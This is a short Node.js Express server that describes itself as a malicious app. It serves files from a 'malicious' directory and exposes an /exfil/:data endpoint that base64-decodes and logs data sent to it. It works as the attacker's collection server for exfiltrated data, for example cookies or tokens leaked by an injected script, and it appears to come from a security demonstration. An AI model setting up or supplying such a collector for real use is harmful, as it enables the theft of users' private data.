const express = require('express');
const atob = require('atob');
const app = express();
const port = 3001;

app.use(express.static('malicious'));

app.get('/exfil/:data', function(req, res) {
    res.status(200).send('Thanks!');

    console.log(atob(req.params.data))
});

app.listen(port, () => console.log(`Malicious app listening on port ${port}!`))